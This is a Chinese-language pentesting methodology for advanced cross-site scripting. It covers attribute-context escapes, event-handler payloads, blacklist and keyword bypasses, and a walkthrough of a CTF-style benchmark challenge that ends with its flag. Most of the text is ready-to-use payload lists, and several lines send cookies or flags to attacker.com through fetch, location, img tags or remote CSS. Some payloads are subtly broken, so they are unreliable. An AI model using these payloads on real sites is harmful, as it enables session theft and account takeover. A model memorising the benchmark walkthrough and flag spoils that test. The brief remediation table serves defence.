# XSS 跨站脚本攻击（高级）

## 1. 文档概述

### 1.1 编写目的
本文档为渗透测试人员提供高级 XSS 攻击技术的方法论，重点针对 HTML 属性上下文注入、事件处理器绕过、弱黑名单绕过等复杂场景。通过本方法论，测试人员能够系统化地检测和利用传统 XSS 检测无法发现的深层漏洞。

### 1.2 适用范围
- 适用于 HTML 属性上下文（value、src、href 等）的 XSS 注入
- 适用于存在弱黑名单过滤的应用
- 适用于事件处理器（onfocus、onclick 等）注入
- 适用于 Flask+PhantomJS 等特定框架组合
- 适用于 CTF XSS 挑战类应用
- 适用于无 CSP 头保护的应用

### 1.3 读者对象
- 执行渗透测试任务的安全工程师
- 进行 XSS 漏洞研究的安全分析师
- CTF 竞赛参赛选手

---

## 2. 核心渗透技术专题

### 专题一：HTML 属性上下文 XSS 注入

#### 2.1 技术介绍

HTML 属性上下文 XSS 是指用户输入被反射到 HTML 标签的属性值中（如 `<input value="用户输入">`），攻击者通过闭合属性引号并注入恶意代码的 XSS 攻击技术。

**漏洞本质：**
- 用户输入未经充分过滤直接输出到 HTML 属性
- 双引号/单引号未被正确转义
- 事件处理器属性可被注入
- 浏览器解析器行为可被利用

#### 2.2 攻击场景

| 业务场景 | 功能示例 | 风险点描述 |
| :--- | :--- | :--- |
| **搜索框** | `<input value="搜索关键词">` | 关键词直接输出到 value 属性 |
| **表单回显** | `<input value="用户输入">` | 错误后回显用户输入 |
| **图片加载** | `<img src="用户提供的 URL">` | URL 未验证直接输出 |
| **链接生成** | `<a href="用户提供的 URL">` | URL 未验证直接输出 |
| **CTF 挑战** | XSS 验证挑战 | 故意设计属性注入场景 |
| **PhantomJS 渲染** | 服务端截图/验证 | 无头浏览器执行 XSS |

#### 2.3 漏洞探测方法

##### 2.3.1 属性上下文识别

**步骤 1：HTML 源码分析**
```bash
# 提交测试 Payload
搜索词："'><test>

# 查看响应源码
# 危险模式 1：双引号未转义
<input value=""><test>">

# 危险模式 2：单引号未转义
<input value=''><test>'>

# 危险模式 3：标签未过滤
<input value=""><test>">
```

**步骤 2：上下文判断**
```bash
# 测试不同闭合方式
# 双引号闭合
"><script>alert(1)</script>

# 单引号闭合
'><script>alert(1)</script>

# 无引号闭合（value 属性）
> <script>alert(1)</script>

# 观察哪种方式能成功注入
```

##### 2.3.2 过滤规则探测

```bash
# 测试常见过滤
# 1. 标签过滤
<script>alert(1)</script>     # 可能被过滤
<img src=x onerror=alert(1)>  # 可能绕过

# 2. 关键词过滤
alert(1)      # 可能被过滤
prompt(1)     # 可能绕过
confirm(1)    # 可能绕过

# 3. 括号过滤
alert(1)      # 可能被过滤
alert`1`      # 反引号绕过
```

#### 2.4 漏洞利用方法

##### 2.4.1 双引号属性逃逸

**场景 1：input value 属性注入**
```html
<!-- 原始代码 -->
<input type="text" value="用户输入" name="search">

<!-- Payload 1：双引号闭合 + 事件处理器 -->
" onfocus="alert(1)" autofocus="

<!-- 完整渲染 -->
<input type="text" value="" onfocus="alert(1)" autofocus="" name="search">

<!-- Payload 2：闭合 + 新标签 -->
"><script>alert(1)</script>

<!-- 完整渲染 -->
<input type="text" value=""><script>alert(1)</script>">
```

**场景 2：img src 属性注入**
```html
<!-- 原始代码 -->
<img src="用户提供的 URL" alt="Image">

<!-- Payload -->
" onerror="alert(1)" src="x

<!-- 完整渲染 -->
<img src="x" onerror="alert(1)" alt="Image">
```

##### 2.4.2 事件处理器注入

**Payload 集合：**
```html
<!-- onfocus + autofocus（推荐） -->
" onfocus="alert(1)" autofocus="

<!-- onclick -->
" onclick="alert(1)" x="

<!-- onmouseover -->
" onmouseover="alert(1)" x="

<!-- onmouseenter -->
" onmouseenter="alert(1)" x="

<!-- onanimationend（高级绕过） -->
" style="animation-name:x" onanimationend="alert(1)" x="
```

**自动触发技巧：**
```html
<!-- autofocus 自动触发 -->
<input onfocus="alert(1)" autofocus>

<!-- 表单自动提交 -->
<form><button formaction="javascript:alert(1)">X

<!-- SVG 自动加载 -->
<svg onload="alert(1)">
```

##### 2.4.3 弱黑名单绕过

**场景 1：过滤 `<script>` 标签**
```html
<!-- 绕过方法 1：使用其他标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- 绕过方法 2：使用事件处理器 -->
" onfocus="alert(1)" autofocus="
```

**场景 2：过滤字母数字**
```html
<!-- 使用反引号 -->
`alert(1)`

<!-- 使用 String.fromCharCode -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- 使用编码 -->
<script>alert('\x31')</script>
```

**场景 3：过滤特定关键词**
```html
<!-- alert 被过滤 -->
alert(1)

<!-- 绕过方法 -->
prompt(1)
confirm(1)
print(1)
window['al'+'ert'](1)
```

##### 2.4.4 Flask+PhantomJS 特定绕过

**场景：PhantomJS 拦截 alert/confirm/prompt**
```javascript
// PhantomJS 可能覆盖这些函数
// 绕过方法 1：使用其他执行方式
<img src=x onerror=window.status='XSS'>

// 绕过方法 2：使用 location
<img src=x onerror="location='http://attacker.com/?xss='+document.cookie">

// 绕过方法 3：使用 fetch/XHR
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">

// 绕过方法 4：使用 img 外带
<img src="http://attacker.com/?cookie="+document.cookie>
```

**CTF Flag 外带：**
```javascript
// 方法 1：通过 URL 外带 Flag
<img src="http://attacker.com/?flag="+document.title>

// 方法 2：通过 fetch 发送
<script>
fetch('http://attacker.com/log', {
    method: 'POST',
    body: document.title  // Flag 通常在 title 中
});
</script>

// 方法 3：通过 location 外带
location='http://attacker.com/?'+document.title.split(': ')[1]
```

##### 2.4.5 黑名单 `<style>` 标签绕过技术（XBEN-015-24 实战技术）

**场景：应用使用正则黑名单过滤，但明确允许 `<style>` 标签**

**过滤规则特征：**
```python
# Flask 应用典型黑名单过滤代码
blacklist = r'<(?!style\b)[^>]+>'  # 负向前瞻：允许 style 标签
msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
```

**绕过原理分析：**
- 正则 `<(?!style\b)[^>]+>` 匹配所有非 `<style` 开头的 HTML 标签
- `<style>` 标签被明确排除在过滤之外
- 但 `<style>` 标签本身不执行 JavaScript，需要特殊技术

**利用方法 1：Self-closing Tag + 事件处理器**
```html
<!-- Payload：自闭合标签语法 -->
<style/onload=alert('XSS')>

<!-- 原理说明 -->
1. 标签以 `<style` 开头，通过负向前瞻检查
2. `/onload=alert('XSS')` 被解析为标签属性
3. 浏览器将 `/` 解析为自闭合语法（类似 XML）
4. onload 事件处理器在标签加载时执行

<!-- 完整利用链 -->
GET /page?name=<style/onload=alert('XSS')>

<!-- PhantomJS 检测到 alert('XSS') 触发，返回 Flag -->
```

**利用方法 2：CSS expression（PhantomJS/旧 WebKit）**
```html
<!-- Payload：CSS expression -->
<style>div{width:expression(alert('XSS'))}</style><div>

<!-- 原理说明 -->
- expression() 是 IE 和旧 WebKit 支持的 CSS 功能
- PhantomJS 使用 QtWebKit，可能支持此功能
- CSS 表达式在渲染时执行 JavaScript

<!-- 注意：现代浏览器已移除此功能 -->
```

**利用方法 3：CSS url() + javascript: 协议**
```html
<!-- Payload：CSS url + javascript 协议 -->
<style>body{background:url('javascript:alert("XSS")')}</style>

<!-- 原理说明 -->
- javascript: 协议在 CSS url() 中可能被执行
- 依赖浏览器引擎实现
- PhantomJS 可能支持此功能
```

**利用方法 4：CSS @import 注入**
```html
<!-- Payload：@import 注入 -->
<style>@import 'javascript:alert("XSS")';</style>

<!-- 或外部 CSS 注入 -->
<style>@import 'http://attacker.com/evil.css';</style>

<!-- evil.css 内容 -->
body{background:url('javascript:alert("XSS")')}
```

**利用方法 5：DOM Clobbering + CSS**
```html
<!-- Payload：DOM Clobbering -->
<style id="XSS">
  @keyframes x{from{background-position:0 0}to{background-position:0 0}}
</style>
<div style="animation:x" onanimationend="alert('XSS')"></div>

<!-- 原理说明 -->
1. <style> 标签通过过滤
2. 定义 CSS 动画
3. 使用内联 style 属性（如果允许）触发事件
```

**实战案例：Dalgona Challenges CTF**
```bash
# 目标环境
URL: http://localhost:33841/page?name=<payload>
过滤：r'<(?!style\b)[^>]+>'  # 允许<style>标签
验证：PhantomJS 检测 alert/confirm/prompt

# 攻击步骤
# 1. 确认<style>标签通过过滤
curl "http://localhost:33841/page?name=<style>test</style>"
# 响应中包含：<style>test</style>

# 2. 测试自闭合语法
curl "http://localhost:33841/page?name=<style/onload=alert('XSS')>"
# PhantomJS 检测到 alert('XSS')，返回 Flag

# 3. 获取 Flag
# 响应：Congratulations! Here is the flag: FLAG{f0e68b39faf21a895f14e832f1f7738292e0c85ef7373df8931ae61c0853fd21}
```

**Payload 速查表：**
| Payload | 绕过原理 | 适用场景 |
|---------|---------|---------|
| `<style/onload=alert('XSS')>` | 自闭合标签 + 事件处理器 | PhantomJS/旧 WebKit |
| `<style><svg onload=alert(1)>` | style 内嵌套 svg | 允许嵌套标签 |
| `<style>@import 'javascript:alert(1)'</style>` | CSS @import | 支持 javascript 协议 |
| `<style>body{background:url('javascript:alert(1)')}</style>` | CSS url() | 旧 WebKit 引擎 |
| `<style/onload=fetch('http://attacker.com/?c='+document.cookie)>` | 数据外带 | 无回显场景 |

#### 2.5 漏洞利用绕过方法

##### 2.5.1 编码绕过

```html
<!-- HTML 实体编码 -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- URL 编码 -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode 编码 -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Base64 编码（需配合 eval） -->
<script>eval(atob('YWxlcnQoMSk='))</script>
```

##### 2.5.2 分割绕过

```javascript
// 字符串分割
'al'+'ert'

// 数组 join
['a','l','e','r','t'].join('')

// 变量拼接
a='al';b='ert';window[a+b](1)
```

##### 2.5.3 大小写绕过

```html
<!-- 某些过滤器只检查小写 -->
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

---

## 3. 附录

### 3.1 XSS Payload 速查表

| 场景 | Payload | 说明 |
| :--- | :--- | :--- |
| 属性逃逸 | `" onfocus="alert(1)" autofocus="` | 双引号闭合 + 自动触发 |
| 标签注入 | `"><script>alert(1)</script>` | 直接注入 script 标签 |
| img 标签 | `<img src=x onerror=alert(1)>` | 经典 img 注入 |
| svg 标签 | `<svg onload=alert(1)>` | SVG 注入 |
| 反引号 | `` `alert(1)` `` | 绕过引号过滤 |
| 无括号 | `alert`1`` | 反引号代替括号 |
| 外带 Cookie | `<img src="http://attacker.com/?c="+document.cookie>` | 数据外带 |
| 外带 Flag | `location='http://attacker.com/?'+document.title` | Flag 外带 |

### 3.2 常见过滤规则绕过

| 过滤规则 | 绕过方法 |
| :--- | :--- |
| `<script>` 标签 | 使用 `<img>`, `<svg>`, `<body>` |
| `alert` 关键词 | 使用 `prompt`, `confirm`, `print` |
| 括号 `()` | 使用反引号 `` ` `` |
| 引号 `"'` | 使用反引号、编码、字符串拼接 |
| 字母数字 | HTML 实体编码、Unicode 编码 |
| 空格 | 使用 `/`、换行符、Tab |

### 3.3 利用检查清单

- [ ] 识别输入点输出的 HTML 上下文
- [ ] 测试引号闭合（单引号/双引号）
- [ ] 测试标签闭合（`>`）
- [ ] 测试事件处理器注入
- [ ] 测试 autofocus 自动触发
- [ ] 探测过滤规则（标签/关键词/字符）
- [ ] 选择合适的绕过技术
- [ ] 构造最终 Payload
- [ ] 验证 XSS 执行（弹窗/外带）
- [ ] 提取敏感数据（Cookie/Flag）

### 3.4 修复建议

| 问题 | 修复方案 |
| :--- | :--- |
| 引号未转义 | 使用 `htmlentities($input, ENT_QUOTES)` |
| 标签未过滤 | 白名单过滤或使用 `strip_tags()` |
| 事件处理器注入 | 移除所有 `on*` 属性 |
| 无 CSP 保护 | 添加 Content-Security-Policy 头 |
| 无输入验证 | 实施严格的输入验证和输出编码 |

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**参考来源：** XBEN-014-24 渗透测试实战分析
